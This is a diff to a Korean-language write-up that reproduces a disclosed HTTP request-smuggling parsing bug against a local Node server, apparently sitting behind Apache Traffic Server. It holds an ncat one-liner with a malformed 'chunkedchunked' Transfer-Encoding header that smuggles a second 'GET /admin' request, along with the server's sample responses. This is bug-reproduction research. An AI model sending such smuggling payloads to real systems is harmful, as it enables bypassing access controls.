@@ -32,7 +32,7 @@ node app.js 3000
       "Headers": req.headers,
       "Length": body.length,
       "Body": body,
-    }) + "\n");
+    }, undefined, 2) + "\n");
   });
 ```
 
@@ -41,7 +41,7 @@ node app.js 3000
 로컬에서 실행했을 때에는, Windows Powershell과 [NMap](https://nmap.org/ncat/)의 ncat을 사용해서 [파싱 버그를 재현](https://hackerone.com/reports/1524555)했었습니다.
 
 ``` console
-echo "GET / HTTP/1.1`r`nTransfer-Encoding: chunkedchunked`r`n`r`n26`r`nGET / HTTP/1.1`r`nContent-Length: 30`r`n`r`n`r`n0`r`n`r`n`r`nGET /admin HTTP/1.1`r`n" | ncat localhost 8080
+echo "GET / HTTP/1.1`r`nTransfer-Encoding: chunkedchunked`r`n`r`n26`r`nGET / HTTP/1.1`r`nContent-Length: 30`r`n`r`n`r`n0`r`n`r`n`r`nGET /admin HTTP/1.1`r`n" | ncat localhost 3000
 ```
 
 이렇게 요청했을 때 응답이 이래야 합니다:
@@ -50,24 +50,36 @@ echo "GET / HTTP/1.1`r`nTransfer-Encoding: chunkedchunked`r`n`r`n26`r`nGET / HTT
 
 ```
 HTTP/1.1 200 OK
-Date: Wed, 01 Nov 2023 06:58:11 GMT
+Date: Wed, 01 Nov 2023 10:17:28 GMT
 Connection: keep-alive
 Keep-Alive: timeout=5
-Content-Length: 127
+Content-Length: 153
 
-{"URL":"/","Headers":{"transfer-encoding":"chunkedchunked"},"Length":38,"Body":"GET / HTTP/1.1\r\nContent-Length: 30\r\n\r\n"}
+{
+  "URL": "/",
+  "Headers": {
+    "transfer-encoding": "chunkedchunked"
+  },
+  "Length": 38,
+  "Body": "GET / HTTP/1.1\r\nContent-Length: 30\r\n\r\n"
+}
 ```
 
 응답 2번째:
 
 ```
 HTTP/1.1 200 OK
-Date: Wed, 01 Nov 2023 06:58:11 GMT
+Date: Wed, 01 Nov 2023 10:17:28 GMT
 Connection: keep-alive
 Keep-Alive: timeout=5
-Content-Length: 51
+Content-Length: 68
 
-{"URL":"/admin","Headers":{},"Length":0,"Body":""}
+{
+  "URL": "/admin",
+  "Headers": {},
+  "Length": 0,
+  "Body": ""
+}
 ```
 
 중요한 건 ATS가 첫 번째 요청을 무시하면서 그걸 노드에 그대로 전달해주는지 마는지네요.
